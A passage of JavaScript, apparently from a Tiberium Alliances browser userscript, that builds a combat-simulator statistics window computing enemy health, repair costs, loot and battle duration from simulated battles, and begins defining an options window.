                                    if (this.Stats.Loot.Tib.Base > 0 || this.Stats.Loot.Cry.Base > 0 || this.Stats.Loot.Cred.Base > 0 || this.Stats.Loot.RP.Base > 0 || this.Stats.Loot.Overall.Base > 0) { 
                                        //Loot.Tib 
                                        this.Label.Loot.Tib.resetToolTipText(); 
                                        this.Label.Loot.Tib.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Tib.Base)); 
                                        //Loot.Cry 
                                        this.Label.Loot.Cry.resetToolTipText(); 
                                        this.Label.Loot.Cry.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cry.Base)); 
                                        //Loot.Cred 
                                        this.Label.Loot.Cred.resetToolTipText(); 
                                        this.Label.Loot.Cred.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cred.Base)); 
                                        //Loot.RP 
                                        this.Label.Loot.RP.resetToolTipText(); 
                                        this.Label.Loot.RP.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.RP.Base)); 
                                        //Loot.Overall 
                                        this.Label.Loot.Overall.resetToolTipText(); 
                                        this.Label.Loot.Overall.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Overall.Base)); 
                                    } 
                                } 
                            }; 
                            this.ResetStats = function () { 
                                this.Stats.Battle.Outcome = 0; 
                                this.Stats.Battle.Duration = 0; 
                                this.Stats.Battle.OwnCity = ""; 
                                this.Stats.EnemyHealth.Overall = new _StatsUnit(); 
                                this.Stats.EnemyHealth.Base = new _StatsUnit(); 
                                this.Stats.EnemyHealth.Defense = new _StatsUnit(); 
                                this.Stats.EnemyHealth.CY = new _StatsUnit(); 
                                this.Stats.EnemyHealth.DF = new _StatsUnit(); 
                                this.Stats.EnemyHealth.CC = new _StatsUnit(); 
                                this.Stats.Repair.Storage = 0; 
                                this.Stats.Repair.Overall = new _StatsUnit(); 
                                this.Stats.Repair.Inf = new _StatsUnit(); 
                                this.Stats.Repair.Vehi = new _StatsUnit(); 
                                this.Stats.Repair.Air = new _StatsUnit(); 
                                this.Stats.Loot.Tib.Battle = 0; 
                                this.Stats.Loot.Cry.Battle = 0; 
                                this.Stats.Loot.Cred.Battle = 0; 
                                this.Stats.Loot.RP.Battle = 0; 
                                this.Stats.Loot.Overall.Battle = 0; 
                            }; 
                            this.ResetLabels = function () { 
                                this.Label.Battle.Outcome.resetIcon(); 
                                this.Label.Battle.Outcome.resetToolTipIcon(); 
                                this.Label.Battle.Outcome.resetToolTipText(); 
                                this.Label.Battle.Outcome.setShow("label"); 
                                this.Label.Battle.Outcome.setLabel("-"); 
                                this.Label.Battle.Duration.setValue("-:--"); 
                                this.Label.Battle.OwnCity.setValue("-"); 
                                this.Label.EnemyHealth.Overall.setValue("-"); 
                                this.Label.EnemyHealth.Overall.resetToolTipText(); 
                                this.Label.EnemyHealth.Overall.resetTextColor(); 
                                this.Label.EnemyHealth.Base.setValue("-"); 
                                this.Label.EnemyHealth.Base.resetToolTipText(); 
                                this.Label.EnemyHealth.Base.resetTextColor(); 
                                this.Label.EnemyHealth.Defense.setValue("-"); 
                                this.Label.EnemyHealth.Defense.resetToolTipText(); 
                                this.Label.EnemyHealth.Defense.resetTextColor(); 
                                this.Label.EnemyHealth.CY.setValue("-"); 
                                this.Label.EnemyHealth.CY.resetToolTipText(); 
                                this.Label.EnemyHealth.CY.resetTextColor(); 
                                this.Label.EnemyHealth.DF.setValue("-"); 
                                this.Label.EnemyHealth.DF.resetToolTipText(); 
                                this.Label.EnemyHealth.DF.resetTextColor(); 
                                this.Label.EnemyHealth.CC.setValue("-"); 
                                this.Label.EnemyHealth.CC.resetToolTipText(); 
                                this.Label.EnemyHealth.CC.resetTextColor(); 
                                this.Label.Repair.Storage.setValue("-"); 
                                this.Label.Repair.Storage.resetToolTipText(); 
                                this.Label.Repair.Storage.resetTextColor(); 
                                this.Label.Repair.Overall.setValue("-"); 
                                this.Label.Repair.Overall.resetToolTipText(); 
                                this.Label.Repair.Overall.resetTextColor(); 
                                this.Label.Repair.Inf.setValue("-"); 
                                this.Label.Repair.Inf.resetToolTipText(); 
                                this.Label.Repair.Inf.resetTextColor(); 
                                this.Label.Repair.Vehi.setValue("-"); 
                                this.Label.Repair.Vehi.resetToolTipText(); 
                                this.Label.Repair.Vehi.resetTextColor(); 
                                this.Label.Repair.Air.setValue("-"); 
                                this.Label.Repair.Air.resetToolTipText(); 
                                this.Label.Repair.Air.resetTextColor(); 
                                this.Label.Loot.Tib.setValue("-"); 
                                this.Label.Loot.Tib.resetToolTipText(); 
                                this.Label.Loot.Tib.resetTextColor(); 
                                this.Label.Loot.Cry.setValue("-"); 
                                this.Label.Loot.Cry.resetToolTipText(); 
                                this.Label.Loot.Cry.resetTextColor(); 
                                this.Label.Loot.Cred.setValue("-"); 
                                this.Label.Loot.Cred.resetToolTipText(); 
                                this.Label.Loot.Cred.resetTextColor(); 
                                this.Label.Loot.RP.setValue("-"); 
                                this.Label.Loot.RP.resetToolTipText(); 
                                this.Label.Loot.RP.resetTextColor(); 
                                this.Label.Loot.Overall.setValue("-"); 
                                this.Label.Loot.Overall.resetToolTipText(); 
                                this.Label.Loot.Overall.resetTextColor(); 
                            }; 
                            this.Reset = function () { 
                                var ownCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
                                if (this.TargetCity === null || ownCity.get_CityArmyFormationsManager().get_CurrentTargetBaseId() != this.TargetCity.get_Id()) { 
                                    simulated = false; 
                                    this.OwnCity = null; 
                                    this.TargetCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(); 
                                    ownCity.get_CityArmyFormationsManager().set_CurrentTargetBaseId(this.TargetCity.get_Id()); 
                                    this.ResetStats(); 
                                    this.ResetLabels(); 
//                                    this.getLootFromCurrentCity(); 
                                } 
                            }; 
                            this.Select = function (selected) { 
                                if (selected == instance) { 
                                    var j = "pane-light-opaque"; 
                                    var k = 1; 
                                } else { 
                                    var j = "pane-light-plain"; 
                                    var k = 0.6; 
                                } 
                                this.Label.Battle.container.set({ decorator: j, opacity: k }); 
                                this.Label.EnemyHealth.container.set({ decorator: j, opacity: k }); 
                                this.Label.Repair.container.set({ decorator: j, opacity: k }); 
                                this.Label.Loot.container.set({ decorator: j, opacity: k }); 
                            }; 
                            this.saveFormation = function () { 
                                try { 
                                    Formation = []; 
                                    var unitList = Simulator.getInstance().getCityPreArmyUnits().get_ArmyUnits().l; 
 
                                    for (var i = 0; i < unitList.length; i++) { 
                                        var unit = unitList[i]; 
                                        var unitInfo = {}; 
                                        unitInfo.x = unit.get_CoordX(); 
                                        unitInfo.y = unit.get_CoordY(); 
                                        unitInfo.id = unit.get_Id(); 
                                        unitInfo.enabled = unit.get_Enabled(); 
 
                                        Formation.push(unitInfo); 
                                    } 
                                } catch (e) { 
                                    console.log("Error Saving Stat Formation"); 
                                    console.log(e.toString()); 
                                } 
                            }; 
                            this.loadFormation = function () { 
                                try { 
                                    var cities = ClientLib.Data.MainData.GetInstance().get_Cities(); 
                                    cities.set_CurrentOwnCityId(this.OwnCity.get_Id()); 
                                    Simulator.getInstance().restoreFormation(Formation); 
                                } catch (e) { 
                                    console.log("Error loading Stat Formation"); 
                                    console.log(e.toString()); 
                                } 
                            }; 
 
                            // Setup icons 
                            this.Label.Battle.Outcome.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
 
                            // Setup containers 
                            this.Label.Battle.container.add(this.Label.Battle.Outcome); 
                            this.Label.Battle.container.add(this.Label.Battle.Duration); 
                            this.Label.Battle.container.add(this.Label.Battle.OwnCity); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.Overall); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.Base); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.Defense); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.CY); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.DF); 
                            this.Label.EnemyHealth.container.add(this.Label.EnemyHealth.CC); 
                            this.Label.Repair.container.add(this.Label.Repair.Storage); 
                            this.Label.Repair.container.add(this.Label.Repair.Overall); 
                            this.Label.Repair.container.add(this.Label.Repair.Inf); 
                            this.Label.Repair.container.add(this.Label.Repair.Vehi); 
                            this.Label.Repair.container.add(this.Label.Repair.Air); 
                            this.Label.Loot.container.add(this.Label.Loot.Tib); 
                            this.Label.Loot.container.add(this.Label.Loot.Cry); 
                            this.Label.Loot.container.add(this.Label.Loot.Cred); 
                            this.Label.Loot.container.add(this.Label.Loot.RP); 
                            this.Label.Loot.container.add(this.Label.Loot.Overall); 
 
                            // Setup Events 
                            this.Label.Battle.container.addListener("click", function () { Simulator.StatWindow.getInstance().simSelected = instance; for (var i = 0; i < Simulator.StatWindow.getInstance().sim.length; i++) { Simulator.StatWindow.getInstance().sim[i].Select(instance); } }, this); 
                            this.Label.EnemyHealth.container.addListener("click", function () { Simulator.StatWindow.getInstance().simSelected = instance; for (var i = 0; i < Simulator.StatWindow.getInstance().sim.length; i++) { Simulator.StatWindow.getInstance().sim[i].Select(instance); } }, this); 
                            this.Label.Repair.container.addListener("click", function () { Simulator.StatWindow.getInstance().simSelected = instance; for (var i = 0; i < Simulator.StatWindow.getInstance().sim.length; i++) { Simulator.StatWindow.getInstance().sim[i].Select(instance); } }, this); 
                            this.Label.Loot.container.addListener("click", function () { Simulator.StatWindow.getInstance().simSelected = instance; for (var i = 0; i < Simulator.StatWindow.getInstance().sim.length; i++) { Simulator.StatWindow.getInstance().sim[i].Select(instance); } }, this); 
                            this.Label.Battle.container.addListener("dblclick", function () { this.loadFormation(); }, this); 
                            this.Label.EnemyHealth.container.addListener("dblclick", function () { this.loadFormation(); }, this); 
                            this.Label.Repair.container.addListener("dblclick", function () { this.loadFormation(); }, this); 
                            this.Label.Loot.container.addListener("dblclick", function () { this.loadFormation(); }, this); 
                            this.Label.EnemyHealth.container.addListener("contextmenu", function () { 
                                if (localStorage['getEHSelection'] == "hp rel") localStorage['getEHSelection'] = "hp"; 
                                else localStorage['getEHSelection'] = "hp rel"; 
                            }, this); 
                            this.Label.Repair.container.addListener("contextmenu", function () { 
                                if (localStorage['getRTSelection'] == "cry") localStorage['getRTSelection'] = "rt"; 
                                else if (localStorage['getRTSelection'] == "hp") localStorage['getRTSelection'] = "hp rel"; 
                                else if (localStorage['getRTSelection'] == "hp rel") localStorage['getRTSelection'] = "cry"; 
                                else localStorage['getRTSelection'] = "hp"; 
                            }, this); 
                        } catch (e) { 
                            console.log("Error init Simulation"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    simulateStats: function () { 
                        var city = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(); 
                        if (city != null) { 
                            Simulator.getInstance().isSimulation = true; 
                            Simulator.getInstance().saveTempFormation(); 
                            localStorage['ta_sim_last_city'] = city.get_Id(); 
                            var ownCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
                            ownCity.get_CityArmyFormationsManager().set_CurrentTargetBaseId(city.get_Id()); 
                            ClientLib.API.Battleground.GetInstance().SimulateBattle(); 
                        } 
                    }, 
                    doSimReplay: function () { 
                        try { 
                            Simulator.getInstance().isSimulation = true; 
                            var app = qx.core.Init.getApplication(); 
                            app.getPlayArea().setView(ClientLib.Data.PlayerAreaViewMode.pavmCombatReplay, localStorage['ta_sim_last_city'], 0, 0); 
 
                            if (localStorage['autoSimulate'] !== undefined) { 
                                if (localStorage['autoSimulate'] == "yes") { 
                                    var speed = localStorage['simulateSpeed']; 
                                    setTimeout(function () { 
                                        var battleground = ClientLib.Vis.VisMain.GetInstance().get_Battleground(); 
                                        battleground.RestartReplay(); 
                                        battleground.set_ReplaySpeed(parseInt(speed, 10)); 
                                    }, 1000); 
                                } 
                            } 
                        } catch (e) { 
                            console.log("Error attempting to show Simulation Replay"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    calculateRepairCosts: function (id, level, sHealth, eHealth, mHealth) { 
                        var repairCosts = { RT: 0, Cry: 0, Tib: 0 }; 
                        var dmgRatio = 1; 
                        if (sHealth != eHealth) { 
                            dmgRatio = (sHealth - eHealth) / mHealth; 
                            var costs = ClientLib.API.Util.GetUnitRepairCosts(level, id, dmgRatio); 
 
                            for (var idx = 0; idx < costs.length; idx++) { 
                                var uCosts = costs[idx]; 
                                var cType = parseInt(uCosts.Type, 10); 
                                switch (cType) { 
                                case ClientLib.Base.EResourceType.Tiberium: 
                                    repairCosts.Tib += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.Crystal: 
                                    repairCosts.Cry += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.RepairChargeBase: 
                                case ClientLib.Base.EResourceType.RepairChargeInf: 
                                case ClientLib.Base.EResourceType.RepairChargeVeh: 
                                case ClientLib.Base.EResourceType.RepairChargeAir: 
                                    repairCosts.RT += uCosts.Count; 
                                    break; 
                                } 
                            } 
 
                            // Fix Repairtime for Forgotten 
                            switch (ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity().get_CityFaction()) { 
                            case ClientLib.Base.EFactionType.GDIFaction: 
                            case ClientLib.Base.EFactionType.NODFaction: 
                                break; 
                            default: 
                                repairCosts.RT = dmgRatio * 3600; 
                                break; 
                            } 
 
                        } 
                        return repairCosts; 
                    }, 
                    _onTick: function () { 
                        for (var i = 0; i < this.sim.length; i++) this.sim[i].UpdateLabels(); 
                    }, 
                    _onViewChanged: function (oldMode, newMode) { 
                        if (newMode == ClientLib.Vis.Mode.CombatSetup && oldMode != ClientLib.Vis.Mode.Battleground) { 
                            this.getLootFromCurrentCity(); 
                            // Auto open StatWindow 
                            if (localStorage['autoOpenStat'] !== undefined && localStorage['autoOpenStat'] == "yes") this.open(); 
                            else { 
                                this.open(); 
                                localStorage['autoOpenStat'] = "yes"; // Default 
                            } 
                        } else if (newMode != ClientLib.Vis.Mode.CombatSetup && newMode != ClientLib.Vis.Mode.Battleground) { 
                            this.close(); 
                        } 
                    }, 
                    __OnSimulateBattleFinished: function (data) { 
                        //Disable Simulate Button 
                        if (this.isSimStatButtonDisabled == false) { 
                            this.disableSimulateStatButtonTimer(10000); 
                            if (typeof Simulator.getInstance().disableSimulateButtonTimer === "function") { 
                                Simulator.getInstance().disableSimulateButtonTimer(10000); 
                            } 
                        } 
                        if (this.simReplayBtn.getEnabled() == false) this.simReplayBtn.setEnabled(true); 
 
                        this.sim[this.simSelected].setSimulation(data); 
                        this.calcHealth(this.sim[this.simSelected]); 
                        this.calcLoot(this.sim[this.simSelected]); 
                        this.getBattleDuration(this.sim[this.simSelected]); 
                    }, 
                    calcHealth: function (sim) { 
                        try { 
                            sim.ResetStats(); 
                            var costs = {}; 
                            var targetunits = []; 
                            var ownunits = []; 
                            for (var i = 0; i < sim.Result.length; i++) { 
                                var unit = ClientLib.Res.ResMain.GetInstance().GetUnit_Obj(sim.Result[i].t); 
                                switch (unit.pt) { 
                                case ClientLib.Base.EPlacementType.Structure: 
                                case ClientLib.Base.EPlacementType.Defense: 
                                    targetunits.push(sim.Result[i]); 
                                    break; 
                                case ClientLib.Base.EPlacementType.Offense: 
                                    ownunits.push(sim.Result[i]); 
                                    break; 
                                } 
                            } 
                            ClientLib.Data.MainData.GetInstance().get_Cities().set_CurrentCityId(sim.TargetCity.get_Id()); 
                            for (var i = 0; i < targetunits.length; i++) { 
                                var unitData = targetunits[i]; 
                                var unitMDBID = unitData.t; 
                                var unit = ClientLib.Res.ResMain.GetInstance().GetUnit_Obj(unitMDBID); 
                                var unitLevel = unitData.l; 
                                var unitStartHealth = Math.floor(unitData.sh); 
                                var unitEndHealth = Math.floor(unitData.h); 
                                var unitMaxHealth = Math.floor((ClientLib.API.Util.GetUnitMaxHealthByLevel(unitLevel, unit, false)) * 16); 
                                var unitPlacementType = unit.pt; // ClientLib.Base.EPlacementType 
                                var unitMovementType = unit.mt; // ClientLib.Base.EUnitMovementType 
                                switch (sim.TargetCity.get_CityFaction()) { 
                                case ClientLib.Base.EFactionType.GDIFaction: 
                                case ClientLib.Base.EFactionType.NODFaction: 
                                    unitMaxHealth = Math.floor((ClientLib.API.Util.GetUnitMaxHealthByLevel(unitLevel, unit, true)) * 16); 
                                    break; 
                                } 
                                costs = this.calculateRepairCosts(unitMDBID, unitLevel, unitStartHealth, unitEndHealth, unitMaxHealth); 
 
                                switch (unitPlacementType) { 
                                case ClientLib.Base.EPlacementType.Structure: 
                                    sim.Stats.EnemyHealth.Overall.StartHealth += unitStartHealth; 
                                    sim.Stats.EnemyHealth.Overall.EndHealth += unitEndHealth; 
                                    sim.Stats.EnemyHealth.Overall.MaxHealth += unitMaxHealth; 
                                    sim.Stats.EnemyHealth.Overall.RT += costs.RT; 
                                    sim.Stats.EnemyHealth.Overall.Tib += costs.Tib; 
                                    sim.Stats.EnemyHealth.Overall.Cry += costs.Cry; 
                                    sim.Stats.EnemyHealth.Base.StartHealth += unitStartHealth; 
                                    sim.Stats.EnemyHealth.Base.EndHealth += unitEndHealth; 
                                    sim.Stats.EnemyHealth.Base.MaxHealth += unitMaxHealth; 
                                    sim.Stats.EnemyHealth.Base.RT += costs.RT; 
                                    sim.Stats.EnemyHealth.Base.Tib += costs.Tib; 
                                    sim.Stats.EnemyHealth.Base.Cry += costs.Cry; 
                                    switch (unitMDBID) { 
                                    case 112: // GDI_Construction Yard 
                                    case 151: // NOD_Construction Yard 
                                    case 177: // FOR_Construction Yard 
                                    case 233: // FOR_Fortress_BASE_Construction Yard 
                                        sim.Stats.EnemyHealth.CY.StartHealth += unitStartHealth; 
                                        sim.Stats.EnemyHealth.CY.EndHealth += unitEndHealth; 
                                        sim.Stats.EnemyHealth.CY.MaxHealth += unitMaxHealth; 
                                        sim.Stats.EnemyHealth.CY.RT += costs.RT; 
                                        sim.Stats.EnemyHealth.CY.Tib += costs.Tib; 
                                        sim.Stats.EnemyHealth.CY.Cry += costs.Cry; 
                                        break; 
                                    case 131: // GDI_Defense Facility 
                                    case 158: // NOD_Defense Facility 
                                    case 195: // FOR_Defense Facility 
                                        sim.Stats.EnemyHealth.DF.StartHealth += unitStartHealth; 
                                        sim.Stats.EnemyHealth.DF.EndHealth += unitEndHealth; 
                                        sim.Stats.EnemyHealth.DF.MaxHealth += unitMaxHealth; 
                                        sim.Stats.EnemyHealth.DF.RT += costs.RT; 
                                        sim.Stats.EnemyHealth.DF.Tib += costs.Tib; 
                                        sim.Stats.EnemyHealth.DF.Cry += costs.Cry; 
                                        break; 
                                    case 111: // GDI_Command Center 
                                    case 159: // NOD_Command Post 
                                        sim.Stats.EnemyHealth.CC.StartHealth += unitStartHealth; 
                                        sim.Stats.EnemyHealth.CC.EndHealth += unitEndHealth; 
                                        sim.Stats.EnemyHealth.CC.MaxHealth += unitMaxHealth; 
                                        sim.Stats.EnemyHealth.CC.RT += costs.RT; 
                                        sim.Stats.EnemyHealth.CC.Tib += costs.Tib; 
                                        sim.Stats.EnemyHealth.CC.Cry += costs.Cry; 
                                        break; 
                                    } 
                                    break; 
                                case ClientLib.Base.EPlacementType.Defense: 
                                    sim.Stats.EnemyHealth.Overall.StartHealth += unitStartHealth; 
                                    sim.Stats.EnemyHealth.Overall.EndHealth += unitEndHealth; 
                                    sim.Stats.EnemyHealth.Overall.MaxHealth += unitMaxHealth; 
                                    sim.Stats.EnemyHealth.Overall.Tib += costs.Tib; 
                                    sim.Stats.EnemyHealth.Overall.Cry += costs.Cry; 
                                    sim.Stats.EnemyHealth.Defense.StartHealth += unitStartHealth; 
                                    sim.Stats.EnemyHealth.Defense.EndHealth += unitEndHealth; 
                                    sim.Stats.EnemyHealth.Defense.MaxHealth += unitMaxHealth; 
                                    sim.Stats.EnemyHealth.Defense.Tib += costs.Tib; 
                                    sim.Stats.EnemyHealth.Defense.Cry += costs.Cry; 
                                    break; 
                                } 
                            } 
                            ClientLib.Data.MainData.GetInstance().get_Cities().set_CurrentCityId(sim.OwnCity.get_Id()); 
                            for (var i = 0; i < ownunits.length; i++) { 
                                var unitData = ownunits[i]; 
                                var unitMDBID = unitData.t; 
                                var unit = ClientLib.Res.ResMain.GetInstance().GetUnit_Obj(unitMDBID); 
                                var unitLevel = unitData.l; 
                                var unitStartHealth = Math.floor(unitData.sh); 
                                var unitEndHealth = Math.floor(unitData.h); 
                                var unitMaxHealth = Math.floor((ClientLib.API.Util.GetUnitMaxHealthByLevel(unitLevel, unit, false)) * 16); 
                                var unitPlacementType = unit.pt; // ClientLib.Base.EPlacementType 
                                var unitMovementType = unit.mt; // ClientLib.Base.EUnitMovementType 
                                costs = this.calculateRepairCosts(unitMDBID, unitLevel, unitStartHealth, unitEndHealth, unitMaxHealth); 
 
                                switch (unitPlacementType) { 
                                case ClientLib.Base.EPlacementType.Offense: 
                                    sim.Stats.Repair.Overall.StartHealth += unitStartHealth; 
                                    sim.Stats.Repair.Overall.EndHealth += unitEndHealth; 
                                    sim.Stats.Repair.Overall.MaxHealth += unitMaxHealth; 
                                    sim.Stats.Repair.Overall.Tib += costs.Tib; 
                                    sim.Stats.Repair.Overall.Cry += costs.Cry; 
                                    switch (unitMovementType) { 
                                    case ClientLib.Base.EUnitMovementType.Feet: 
                                        sim.Stats.Repair.Inf.StartHealth += unitStartHealth; 
                                        sim.Stats.Repair.Inf.EndHealth += unitEndHealth; 
                                        sim.Stats.Repair.Inf.MaxHealth += unitMaxHealth; 
                                        sim.Stats.Repair.Inf.RT += costs.RT; 
                                        sim.Stats.Repair.Inf.Tib += costs.Tib; 
                                        sim.Stats.Repair.Inf.Cry += costs.Cry; 
                                        break; 
                                    case ClientLib.Base.EUnitMovementType.Wheel: 
                                    case ClientLib.Base.EUnitMovementType.Track: 
                                        sim.Stats.Repair.Vehi.StartHealth += unitStartHealth; 
                                        sim.Stats.Repair.Vehi.EndHealth += unitEndHealth; 
                                        sim.Stats.Repair.Vehi.MaxHealth += unitMaxHealth; 
                                        sim.Stats.Repair.Vehi.RT += costs.RT; 
                                        sim.Stats.Repair.Vehi.Tib += costs.Tib; 
                                        sim.Stats.Repair.Vehi.Cry += costs.Cry; 
                                        break; 
                                    case ClientLib.Base.EUnitMovementType.Air: 
                                    case ClientLib.Base.EUnitMovementType.Air2: 
                                        sim.Stats.Repair.Air.StartHealth += unitStartHealth; 
                                        sim.Stats.Repair.Air.EndHealth += unitEndHealth; 
                                        sim.Stats.Repair.Air.MaxHealth += unitMaxHealth; 
                                        sim.Stats.Repair.Air.RT += costs.RT; 
                                        sim.Stats.Repair.Air.Tib += costs.Tib; 
                                        sim.Stats.Repair.Air.Cry += costs.Cry; 
                                        break; 
                                    } 
                                    break; 
                                } 
                            } 
                            ClientLib.Data.MainData.GetInstance().get_Cities().set_CurrentCityId(sim.TargetCity.get_Id()); 
 
                            //Set Repair Overall RT 
                            sim.Stats.Repair.Overall.RT = Math.max(sim.Stats.Repair.Inf.RT, sim.Stats.Repair.Vehi.RT, sim.Stats.Repair.Air.RT); 
 
                            //Set Battle Outcome 
                            if (sim.Stats.Repair.Overall.EndHealth === 0)  sim.Stats.Battle.Outcome = 1; 
                            else if (sim.Stats.EnemyHealth.CY.EndHealth === 0) sim.Stats.Battle.Outcome = 3; 
                            else sim.Stats.Battle.Outcome = 2; 
                        } catch (e) { 
                            console.log("Error Getting Player Unit Damage"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    calcLoot: function (sim) { 
                        try { 
                            var Ents = (sim.Result); 
                            var lootArray = { 1: 0, 2: 0, 3: 0, 6: 0 }; 
                            var i, x, y, unit, Entity , mod = -1, unitMaxHealth = 0; 
                            for (y = 0; y < 16; y++) { 
                                for (x = 8; x >= 0; x--) { 
                                    if (y < 8) { 
                                        var width = ClientLib.Vis.VisMain.GetInstance().get_City().get_GridWidth(); 
                                        var height = ClientLib.Vis.VisMain.GetInstance().get_City().get_GridHeight(); 
                                    } else { 
                                        var width = ClientLib.Vis.VisMain.GetInstance().get_DefenseSetup().get_GridWidth(); 
                                        var height = ClientLib.Vis.VisMain.GetInstance().get_DefenseSetup().get_GridHeight(); 
                                    } 
                                    Entity = ClientLib.Vis.VisMain.GetInstance().GetObjectFromPosition(((x * width) + (width / 2)), ((y * height) + (height / 2))); 
                                    if (Entity !== null) { 
                                        for (i = 0; i < Ents.length; i++) { 
                                            unit = ClientLib.Res.ResMain.GetInstance().GetUnit_Obj(Ents[i].t); 
                                            switch (sim.TargetCity.get_CityFaction()) { 
                                            case ClientLib.Base.EFactionType.GDIFaction: 
                                            case ClientLib.Base.EFactionType.NODFaction: 
                                                unitMaxHealth = Math.floor((ClientLib.API.Util.GetUnitMaxHealthByLevel(Ents[i].l, unit, true)) * 16); 
                                                break; 
                                            default: 
                                                unitMaxHealth = Math.floor((ClientLib.API.Util.GetUnitMaxHealthByLevel(Ents[i].l, unit, false)) * 16); 
                                                break; 
                                            } 
                                            mod = (Ents[i].sh - Ents[i].h) / unitMaxHealth; 
                                            if (Entity.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.CityBuildingType && Ents[i].t == Entity.get_BuildingDetails().get_MdbUnitId() && Ents[i].l == Entity.get_BuildingLevel()) { 
                                                var reqs = Entity.get_BuildingDetails().get_UnitLevelRepairRequirements(); 
                                                for (i = 0; i < reqs.length; i++) lootArray[reqs[i].Type] += Math.floor(mod * reqs[i].Count); 
                                                Ents.splice(i, 1); 
                                                break; 
                                            } 
                                            if (Entity.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.DefenseUnitType && Ents[i].t == Entity.get_UnitDetails().get_MdbUnitId() && Ents[i].l == Entity.get_UnitLevel()) { 
                                                var reqs = Entity.get_UnitDetails().get_UnitLevelRepairRequirements(); 
                                                for (i = 0; i < reqs.length; i++) lootArray[reqs[i].Type] += Math.floor(mod * reqs[i].Count); 
                                                Ents.splice(i, 1); 
                                                break; 
                                            } 
                                        } 
                                    } 
                                } 
                            } 
                            var totalLoot = lootArray[1] + lootArray[2] + lootArray[3] + lootArray[6]; 
                            if (sim.Stats.Battle.Outcome === 3) { 
                                sim.Stats.Loot.Overall.Battle = sim.Stats.Loot.Overall.Base; 
                                sim.Stats.Loot.Tib.Battle = sim.Stats.Loot.Tib.Base; 
                                sim.Stats.Loot.Cry.Battle = sim.Stats.Loot.Cry.Base; 
                                sim.Stats.Loot.Cred.Battle = sim.Stats.Loot.Cred.Base; 
                                sim.Stats.Loot.RP.Battle = sim.Stats.Loot.RP.Base; 
                            } else { 
                                sim.Stats.Loot.Overall.Battle = totalLoot; 
                                sim.Stats.Loot.Tib.Battle = lootArray[1]; 
                                sim.Stats.Loot.Cry.Battle = lootArray[2]; 
                                sim.Stats.Loot.Cred.Battle = lootArray[3]; 
                                sim.Stats.Loot.RP.Battle = lootArray[6]; 
                            } 
                        } catch (e) { 
                            console.log("Error Calculating Resources"); 
                            console.log(e); 
                            console.log(e.name + " " + e.message); 
                        } 
 
                    }, 
                    getBattleDuration: function (sim) { 
                        var battleground = ClientLib.Vis.VisMain.GetInstance().get_Battleground(); 
                        if (battleground.get_BattleDuration() != -1) { 
                            sim.Stats.Battle.Duration = battleground.get_BattleDuration(); 
                        } else { 
                            setTimeout(function () { 
                                Simulator.StatWindow.getInstance().getBattleDuration(sim); 
                            }, 100); 
                        } 
                    }, 
                    getLootFromCurrentCity: function () { 
                        try { 
                            var lootArray = { 1: 0, 2: 0, 3: 0, 6: 0 }; 
                            var loot = ClientLib.API.Battleground.GetInstance().GetLootFromCurrentCity(); 
                            if (loot !== null && loot.length > 0) { 
                                for (var i = 0; i < loot.length; i++) lootArray[parseInt(loot[i].Type, 10)] += loot[i].Count; 
                                for (var i = 0; i < this.sim.length; i++) { 
                                    this.sim[i].Reset(); 
                                    this.sim[i].Stats.Loot.Overall.Base = lootArray[1] + lootArray[2] + lootArray[3] + lootArray[6]; 
                                    this.sim[i].Stats.Loot.Tib.Base = lootArray[1]; 
                                    this.sim[i].Stats.Loot.Cry.Base = lootArray[2]; 
                                    this.sim[i].Stats.Loot.Cred.Base = lootArray[3]; 
                                    this.sim[i].Stats.Loot.RP.Base = lootArray[6]; 
                                } 
                            } else { 
                                setTimeout(function () { 
                                    Simulator.StatWindow.getInstance().getLootFromCurrentCity(); 
                                }, 100); 
                            } 
                        } catch (e) { 
                            console.log("Error Getting Loot from Current City"); 
                            console.log(e.toString()); 
                        } 
                    }, 
                    disableSimulateStatButtonTimer: function (timer) { 
                        try { 
                            if (timer >= 1000) { 
                                this.isSimStatButtonDisabled = true; 
                                this.simStatBtn.setEnabled(false); 
                                this.simStatBtn.setLabel(Math.floor(timer / 1000)); 
                                timer -= 1000; 
                                setTimeout(function () { 
                                    Simulator.StatWindow.getInstance().disableSimulateStatButtonTimer(timer); 
                                }, 1000); 
                            } else { 
                                setTimeout(function () { 
                                    Simulator.StatWindow.getInstance().simStatBtn.setEnabled(true); 
                                    Simulator.StatWindow.getInstance().simStatBtn.setLabel("Update"); 
                                }, timer); 
                                this.isSimStatButtonDisabled = false; 
                            } 
                        } catch (e) { 
                            console.log("Error disabling simulator button"); 
                            console.log(e.toString()); 
                        } 
                    } 
                } 
            }); 
            qx.Class.define("Simulator.OptionWindow", { 
                type: "singleton", 
                extend: qx.ui.window.Window, 
 
                construct: function () { 
                    this.base(arguments); 
                    this.setLayout(new qx.ui.layout.VBox(5)); 
                    this.addListener("resize", function () { 
                        this.center(); 
                    }, this); 
 
                    this.set({ 
                        caption: "Simulator Options", 
                        allowMaximize: false, 
                        showMaximize: false, 
                        allowMinimize: false, 
                        showMinimize: false 
                    }); 
                    var qxApp = qx.core.Init.getApplication(); 
                    var tabView = new qx.ui.tabview.TabView(); 
